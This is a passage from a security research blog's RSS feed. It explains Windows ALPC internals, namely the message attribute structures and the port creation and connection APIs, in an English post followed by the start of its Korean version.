href="#4-ALPC-Message-Attribute" class="headerlink" title="4. ALPC Message Attribute"></a>4. ALPC Message Attribute</h2><p>So far we&#x2019;ve looked at <strong>how to create ports, connect them, and send messages</strong>.</p><p>But if ALPC were only about sending messages, there&#x2019;d be no reason for it to be this complex.</p><p>The real reason ALPC is complicated is that, besides the message body, it can also attach various <strong>attributes</strong> to a message:</p><ul><li>Security context (impersonation)</li><li>Shared memory sections (views)</li><li>Handles (files, processes, sections, etc.)</li><li>Token information</li><li>User-defined context</li></ul><p>ALPC is basically a framework that lets you send all of this together in a single NtAlpcSendWaitReceivePort call.</p><h3 id="4-1-ALPC-Message-Attribute"><a href="#4-1-ALPC-Message-Attribute" class="headerlink" title="4.1. ALPC Message Attribute"></a>4.1. ALPC Message Attribute</h3><p>If we look again at the <code>NtAlpcSendWaitReceivePort()</code> signature, we see two extra parameters for attributes:</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,    <span class="hljs-comment">// &#x2190; send-side attributes</span></span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes, <span class="hljs-comment">// &#x2190; receive-side attributes</span></span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li><p><code>SendMessageAttributes</code></p><p>  &#x2192; Attributes we want to attach when sending the message.</p></li><li><p><code>ReceiveMessageAttributes</code></p><p>  &#x2192; Attributes we want to receive along with the response.</p></li></ul><p>So you can think of it as a &#x201C;mutual agreement&#x201D; model for sending attributes.</p><p>At the beginning of the attribute buffer, there is a common header:</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_ATTRIBUTES</span> {</span>    ULONG AllocatedAttributes;  <span class="hljs-comment">// Which attribute types this buffer has space for</span>    ULONG ValidAttributes;      <span class="hljs-comment">// Which attributes are actually valid for this message</span>} ALPC_MESSAGE_ATTRIBUTES, *PALPC_MESSAGE_ATTRIBUTES;</code></pre><ul><li><p><code>AllocatedAttributes</code></p><p>  &#x2192; Bit flags indicating which attribute types this buffer can hold</p></li><li><p><code>ValidAttributes</code></p><p>  &#x2192; Which attributes are actually used for this specific message</p></li></ul><p>To paraphrase it:</p><pre><code class="hljs ini"><span class="hljs-attr">AllocatedAttributes</span> = &#x201C;This buffer can hold these attributes.&#x201D;<span class="hljs-attr">ValidAttributes</span> =  &#x201C;These are the <span class="hljs-literal">on</span>es we&#x2019;re actually using for this message.&#x201D;</code></pre><h3 id="4-2-Main-attribute-types"><a href="#4-2-Main-attribute-types" class="headerlink" title="4.2 Main attribute types"></a>4.2 Main attribute types</h3><p>There are several types of attributes, but let&#x2019;s look at the most important ones.</p><blockquote><p><strong>1. Security Attribute</strong></p></blockquote><p>This includes the sender&#x2019;s security context, which allows the receiver to impersonate the sender.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_SECURITY_ATTR</span> {</span>    ULONG Flags;    PSECURITY_QUALITY_OF_SERVICE pQOS;    HANDLE ContextHandle;} ALPC_SECURITY_ATTR, *PALPC_SECURITY_ATTR;</code></pre><ul><li><code>pQOS</code><ul><li>Pointer to a <code>SECURITY_QUALITY_OF_SERVICE</code> structure</li><li>Controls what level of impersonation, context tracking, etc. is allowed</li></ul></li><li><code>ContextHandle</code><ul><li>Handle to a kernel-managed security context</li></ul></li></ul><hr><blockquote><p><strong>2. View Attribute (Data View Attribute)</strong></p></blockquote><p>Used to pass a shared memory section. This is how you bypass the normal 64KB message size limit.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_DATA_VIEW_ATTR</span> {</span>    ULONG  Flags;    HANDLE SectionHandle;  <span class="hljs-comment">// Section handle attached to the ALPC port</span>    PVOID  ViewBase;       <span class="hljs-comment">// Base address where the section is mapped in this process</span>    SIZE_T ViewSize;       <span class="hljs-comment">// Size of the mapped view</span>} ALPC_DATA_VIEW_ATTR, *PALPC_DATA_VIEW_ATTR;</code></pre><ol><li>Create a shared section and configure a view using <code>NtAlpcCreatePortSection</code> / <code>NtAlpcCreateSectionView</code>.</li><li>Fill an <code>ALPC_DATA_VIEW_ATTR</code> with that information.</li><li>Attach it to the attribute buffer and send it along with the message.</li><li>The receiver maps the same section view in its own address space, effectively sharing memory.</li></ol><hr><blockquote><p><strong>3. Context Attribute</strong></p></blockquote><p>Used to attach user-defined context to a particular client or message.</p><p>The server can use this to track per-client state or per-message state.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_CONTEXT_ATTR</span> {</span>    PVOID PortContext;     <span class="hljs-comment">// Context attached to this port (client)</span>    PVOID MessageContext;  <span class="hljs-comment">// Context attached to this specific message</span>    ULONG Sequence;        <span class="hljs-comment">// Sequence number</span>    ULONG MessageId;       <span class="hljs-comment">// Message ID</span>    ULONG CallbackId;      <span class="hljs-comment">// Callback ID</span>} ALPC_CONTEXT_ATTR, *PALPC_CONTEXT_ATTR;</code></pre><ul><li><code>PortContext</code><ul><li>A pointer to a structure the server associates with the client port (session ID, user info, etc.)</li></ul></li><li><code>MessageContext</code><ul><li>Used when you want separate context per message</li></ul></li><li><code>Sequence</code> / <code>MessageId</code> / <code>CallbackId</code><ul><li>Values set by the kernel</li><li>Help with structured message handling, similar to how TCP tracks state for requests/responses</li></ul></li></ul><hr><blockquote><p><strong>4. Handle Attribute</strong></p></blockquote><p>Used to pass object handles along with the message.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_HANDLE_INFORMATION</span> {</span>    ULONG Index;        <span class="hljs-comment">// Index in the attribute buffer</span>    ULONG Flags;    ULONG Handle;       <span class="hljs-comment">// Handle value (from the sender&#x2019;s perspective)</span>    ULONG ObjectType;   <span class="hljs-comment">// Object type</span>    ACCESS_MASK GrantedAccess; <span class="hljs-comment">// Access rights the receiver will get</span>} ALPC_MESSAGE_HANDLE_INFORMATION, *PALPC_MESSAGE_HANDLE_INFORMATION;</code></pre><ul><li>The kernel checks whether the handle is valid, whether the rights make sense, and whether cross-process duplication is allowed.</li><li>The receiver then uses this information to obtain a valid handle for the corresponding object in its own process.</li></ul><h2 id="Wrapping-Up"><a href="#Wrapping-Up" class="headerlink" title="Wrapping Up"></a>Wrapping Up</h2><p><img src="image%2014.png" alt="image.png"></p><p>So that&#x2019;s the basic flow of ALPC! On the surface it just looks like &#x201C;yet another IPC mechanism,&#x201D; but under the hood, a single call to <code>NtAlpcSendWaitReceivePort()</code> takes care of:</p><ul><li>Managing port objects</li><li>Handling the <code>PORT_MESSAGE</code> header</li><li>Parsing various attributes</li><li>Mapping section views, validating permissions, duplicating handles, etc.</li></ul><p>Because of this complexity, a lot of real-world vulnerabilities tend to appear in the logic that interprets and validates these attributes.</p><p>If I get the chance, I&#x2019;d love to write another post just focusing on ALPC-based vulnerabilities.</p><p>Thanks for reading this long post &#x2014; see you next time! &#x1F44B;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/">https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/</a></p></li><li><p><a href="https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html">https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html</a></p></li><li><p><a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html">https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html</a></p></li><li><p><a href="https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf">https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf</a></p></li><li><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape</a></p></li><li><p><a href="https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf">https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/Local_Inter-Process_Communication">https://en.wikipedia.org/wiki/Local_Inter-Process_Communication</a></p></li><li><p><a href="https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html">https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html</a></p></li><li><p><a href="https://ntdoc.m417z.com/">https://ntdoc.m417z.com/</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/IPC/">IPC</category>
      
      <category domain="https://hackyboiz.github.io/tags/gongjae/">gongjae</category>
      
      <category domain="https://hackyboiz.github.io/tags/ALPC/">ALPC</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/EN/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows ALPC (KR)</title>
      <link>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/</link>
      <guid>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/</guid>
      <pubDate>Sat, 29 Nov 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC774;&#xBC88;&#xC5D0; HackyBoiz&#xB85C; &#xC0C8;&#xB86D;&#xAC8C; &#xB4E4;&#xC5B4;&#xC628; <code>gongjae</code>&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;! &#x1F47B;</p><p>HackyBoiz &#xACAC;&#xC2B5;&#xC0DD;&#xC2DC;&#xC808;.. &#xC81C;&#xAC00; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xB358; Kernel Driver&#xC640; Named Pipe &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xC9C8;&#xBB38;&#xC774; &#xD558;&#xB098; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="image.png"></p><p><del>&#xC544;&#xB2C8;&#xC694;</del></p><p>&#xC0AC;&#xC2E4; ALPC&#xAC00; IPC &#xD1B5;&#xC2E0; &#xBC29;&#xBC95; &#xC911; &#xD558;&#xB098;&#xB77C;&#xB294; &#xAC83;&#xC740; &#xC54C;&#xACE0; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xC774;&#xBC88; &#xAE30;&#xD68C;&#xC5D0; &#xC81C;&#xB300;&#xB85C; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xC790;&#xB294; &#xB9C8;&#xC74C;&#xC73C;&#xB85C; &#xC774; &#xC8FC;&#xC81C;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!! &#xC624;&#xB298;&#xC740; ALPC&#xC758; &#xAC1C;&#xB150;&#xACFC; &#xD1B5;&#xC2E0; &#xD750;&#xB984;, &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xC804;&#xC1A1;&#xB418;&#xB294;&#xC9C0; &#xC9C1;&#xC811; &#xB514;&#xBC84;&#xAE45; &#xD574;&#xBCF4;&#xBA70; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; :)</p><p><img src="image%201.png" alt="image.png"></p><h2 id="1-About-ALPC"><a href="#1-About-ALPC" class="headerlink" title="1. About ALPC"></a>1. About ALPC</h2><p>Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC6D0;&#xACA9;&#xACFC; &#xB85C;&#xCEEC; &#xBAA8;&#xB450;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; IPC &#xD1B5;&#xC2E0;&#xC740; Named Pipe, RPC &#xB4F1;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; ALPC&#xB294; &#xD2B9;&#xC774;&#xD558;&#xAC8C;&#xB3C4; &#xB85C;&#xCEEC;&#xC5D0;&#xC11C;&#xB9CC; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;.</p><p>RPC&#xAC00; Remote Procedure Call&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB2EC;&#xB9AC;, ALPC&#xB294; Advanced Local Procedure Call&#xC744; &#xB73B;&#xD558;&#xBA70;, &#xB54C;&#xB54C;&#xB85C;&#xB294; Asynchronous(&#xBE44;&#xB3D9;&#xAE30;) Local Call&#xB85C;&#xB3C4; &#xBD88;&#xB9B0;&#xB2F5;&#xB2C8;&#xB2E4;!</p><p>&#xBE44;&#xB3D9;&#xAE30;&#xB77C;&#xB294; &#xBA85;&#xCE6D;&#xC740; Windows Vista &#xC2DC;&#xC808;&#xC744; &#xBC18;&#xC601;&#xD574; Vista&#xC5D0;&#xC11C; &#xAE30;&#xC874;&#xC758; LPC&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xAE30; &#xC704;&#xD574; ALPC&#xB97C; &#xB3C4;&#xC785;&#xD55C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p> ALPC&#xB294; &#xBE60;&#xB978; &#xBA54;&#xC2DC;&#xC9C0; &#xD1B5;&#xC2E0;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xB370;&#xC774;&#xD130; &#xC1A1;&#xC218;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="1-1-LPC-to-ALPC"><a href="#1-1-LPC-to-ALPC" class="headerlink" title="1.1. LPC to ALPC"></a>1.1. LPC to ALPC</h3><p><img src="image%202.png" alt="image.png"></p><p>Windows Vista &#xC774;&#xC804; LPC&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC04; &#xACBD;&#xB7C9; IPC&#xB97C; &#xD1B5;&#xD574; Microsoft Windows NT &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB0B4;&#xBD80; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC04; &#xD1B5;&#xC2E0; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;.</p><p>LPC&#xC758; &#xB3D9;&#xAE30;&#xC801; &#xD2B9;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640;  &#xC11C;&#xBC84;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xCC98;&#xB9AC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xC11C;&#xB85C; &#xB300;&#xAE30;&#xD574;&#xC57C;&#xB9CC; &#xD588;&#xACE0;, &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xD589;&#xC774; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; Block &#xB418;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; Vista &#xC2DC;&#xC810;&#xBD80;&#xD130; &#xAE30;&#xC874; LPC &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; &#xC0AC;&#xC2E4;&#xC0C1; ALPC &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC7AC;&#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xACE0;, &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C;ALPC&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; IPC&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.<br>&#xB2E4;&#xB9CC; LPC &#xAD00;&#xB828; API &#xC790;&#xCCB4;&#xAC00; &#x201C;&#xC644;&#xC804;&#xD788; &#xC0AC;&#xB77C;&#xC9C4; &#xAC83;&#x201D;&#xC740; &#xC544;&#xB2C8;&#xACE0;, &#xB0B4;&#xBD80; &#xAD6C;&#xD604;&#xC774; ALPC&#xB85C; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xB41C;&#xB2E4;&#xACE0; &#xBCF4;&#xB294; &#xAC8C; &#xB354; &#xC815;&#xD655;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#x1F4A1;&#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xC744; &#xBCF4;&#xBA74; &#xAE30;&#xC874;&#xC5D0; LPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB358; &#xD568;&#xC218;&#xB294; &#xC720;&#xC9C0;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xD574;&#xB2F9; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; &#xC2E4;&#xC81C;&#xB85C; LPC&#xAC00; &#xC544;&#xB2CC; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB3C4;&#xB85D; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xD558;&#xACE0; &#xC788;&#xC8E0; @.@</p><p><img src="image%203.png" alt="image.png"></p><h3 id="1-2-ALPC-&#xB0B4;&#xBD80;-&#xAD6C;&#xC870;"><a href="#1-2-ALPC-&#xB0B4;&#xBD80;-&#xAD6C;&#xC870;" class="headerlink" title="1.2. ALPC &#xB0B4;&#xBD80; &#xAD6C;&#xC870;"></a>1.2. ALPC &#xB0B4;&#xBD80; &#xAD6C;&#xC870;</h3><p>APLC &#xD1B5;&#xC2E0;&#xC758; &#xC8FC;&#xC694; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB294; ALPC &#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4;&#xC774;&#xBA70;, &#xC0AC;&#xC6A9;&#xBC95;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC18C;&#xCEA3;&#xACFC; &#xC720;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#x2192; &#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xAD50;&#xD658;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5F0;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB294; &#xC18C;&#xCEA3;&#xC744; &#xC5EC;&#xB294; &#xAC83;</p><p>Sysinternals Suite&#xC758; WinObj.exe&#xB97C; &#xD1B5;&#xD574; ALPC &#xD3EC;&#xD2B8;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;!</p><p><img src="image%204.png" alt="image.png"></p><p>&#xB8E8;&#xD2B8; &#xACBD;&#xB85C;&#xC5D0;&#xB3C4; ALPC &#xD3EC;&#xD2B8;&#xAC00; &#xC788;&#xC9C0;&#xB9CC;, &#xB300;&#xBD80;&#xBD84;&#xC740; \RPC Control &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>ALPC &#xD1B5;&#xC2E0;&#xC5D0;&#xB294; &#xCD1D; 3&#xAC1C;&#xC758; ALPC port(&#xC11C;&#xBC84;&#xCE21; 2&#xAC1C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xCE21; 1&#xAC1C;)&#xAC00; &#xAD00;&#xC5EC;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370;, &#xC704; WinObj &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xBCF4;&#xC778; ALPC &#xD3EC;&#xD2B8;&#xB4E4;&#xC740; ALPC Communication Port&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC5F0;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB294; &#xD3EC;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ALPC &#xD1B5;&#xC2E0;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC804;&#xC5D0;, &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xBCF4;&#xAC8C; &#xB420; &#xD568;&#xC218; &#xBA87;&#xAC1C;&#xB97C; &#xBA3C;&#xC800; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>NtAlpcCreatePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>&#xC774; &#xD568;&#xC218;&#xB294; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70;, &#xD3EC;&#xD2B8; &#xC0DD;&#xC131; &#xBC29;&#xC2DD;&#xC740; &#xAE30;&#xC874; LPC&#xC640; &#xD06C;&#xAC8C; &#xB2E4;&#xB974;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xC635;&#xC158;&#xB4E4;&#xC744; &#xB530;&#xB85C; &#xB098;&#xC5F4;&#xD558;&#xB294; &#xB300;&#xC2E0; ALPC_INFO &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xBB36;&#xC5B4;&#xC11C; &#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xB85C; &#xBCF4;&#xB0B4;&#xB294;&#xAC8C; &#xD2B9;&#xC9D5;!</li><li>&#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xD3EC;&#xD2B8; &#xC0DD;&#xC131; &#xC2DC; ALPC &#xAC1D;&#xCCB4;&#xC5D0; &#xBCF5;&#xC0AC;&#xB418;&#xC5B4; &#xCD94; &#xD6C4;&#xC5D0; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCC38;&#xC870;</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_INFO</span></span><span class="hljs-class">{</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_LPCMODE               0x001000 <span class="hljs-comment">// LPC &#xD3EC;&#xD2B8;&#xCC98;&#xB7FC; &#xB3D9;&#xC791;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_CANIMPERSONATE        0x010000 <span class="hljs-comment">// &#xC784;&#xD37C;&#xC18C;&#xB124;&#xC774;&#xC158; &#xD5C8;&#xC6A9;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_REQUEST_ALLOWED       0x020000 <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; &#xD5C8;&#xC6A9;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_SEMAPHORE             0x040000 <span class="hljs-comment">// &#xB3D9;&#xAE30;&#xD654; &#xC2DC;&#xC2A4;&#xD15C;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_HANDLE_EXPOSE         0x080000 <span class="hljs-comment">// &#xD578;&#xB4E4; &#xB178;&#xCD9C; &#xD5C8;&#xC6A9;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_PARENT_SYSTEM_PROCESS 0x100000 <span class="hljs-comment">// &#xCEE4;&#xB110; ALPC &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;</span></span>    ULONG Flags;    SECURITY_QUALITY_OF_SERVICE PortQos;    ULONG MaxMessageSize;    ULONG unknown1;    CHAR  cReserved1[<span class="hljs-number">8</span>];    ULONG MaxViewSize;    CHAR  cReserved2[<span class="hljs-number">8</span>];} ALPC_INFO, *PALPC_INFO;</code></pre><blockquote><p><strong>NtAlpcConnectPort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>PortName&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xD558;&#xB824;&#xB294; &#xD3EC;&#xD2B8; &#xC774;&#xB984;, &#xAC01;&#xC885; &#xC635;&#xC158;&#xB4E4;&#xC744; &#xB123;&#xC744; &#xC218; &#xC788;&#xACE0; &#xCEE4;&#xB110;&#xC774; &#xD574;&#xB2F9; &#xC774;&#xB984;&#xC758; ALPC Connection Port &#xAC1D;&#xCCB4;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xCD94;&#xD6C4;&#xC5D0; &#xC5F0;&#xACB0;&#xC744; &#xC694;&#xCCAD;</li></ul><p><strong>ConnectionFlags &#xC911;&#xC694; Flag</strong></p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_SYNC_CONNECTION   0x020000 <span class="hljs-comment">// &#xB3D9;&#xAE30;&#xC2DD; &#xC5F0;&#xACB0;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_USER_WAIT_MODE    0x100000 <span class="hljs-comment">// &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; Wait</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_WAIT_IS_ALERTABLE 0x200000 <span class="hljs-comment">// Alertable wait</span></span></code></pre><ul><li>default &#xAC12;&#xC73C;&#xB85C;&#xB294; 